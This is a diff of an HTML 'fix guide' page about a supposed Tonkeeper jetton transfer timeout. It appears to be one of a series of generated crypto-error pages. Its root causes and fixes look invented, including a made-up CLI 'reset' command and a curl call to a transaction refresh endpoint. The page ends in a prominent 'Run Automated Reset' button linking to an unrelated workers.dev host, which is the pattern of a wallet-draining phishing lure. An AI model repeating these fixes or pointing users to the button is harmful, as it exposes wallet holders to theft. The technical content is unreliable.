@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,33 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users encounter a "Tonkeeper Jetton Transfer Loop Timeout" error message when attempting to transfer jettons, indicating that the transfer process has exceeded the expected time limit, resulting in a failed transaction.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary discrepancy between the Tonkeeper wallet's internal state and the TON blockchain's current state, leading to an infinite loop of attempts to transfer the Jettons.</li>
+<li>The error occurs due to a prolonged delay in the transaction processing, often caused by network congestion, high gas fees, or issues with the Tonkeeper wallet's connectivity to the TON blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Restart the Tonkeeper application to refresh its internal state</li>
-<li>Check for and install any available updates for the Tonkeeper wallet</li>
-<li>Manually reset the transfer loop by running the following command:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the gas limit to prioritize the transaction</li>
+<li>Restart the Tonkeeper wallet to re-establish a stable connection</li>
+<li>Execute the following code to manually trigger a transaction refresh:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-a<span class="w"> </span>reset_transfer_loop<span class="w"> </span>&lt;wallet_address&gt;
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://testnet.tonkeeper.com/api/v1/transactions<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;transaction_id&quot;: &quot;YOUR_TRANSACTION_ID&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex troubleshooting and diagnostic operations.</p>
+<p>Consider using an external console for more complex troubleshooting and transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Tonkeeper wallet installed and configured</li>
-<li>TON blockchain node synced and operational</li>
-<li>Sufficient TON coins for transaction fees</li>
+<li>Active internet connection to the TON blockchain</li>
+<li>Sufficient balance of TON coins to cover transaction fees</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
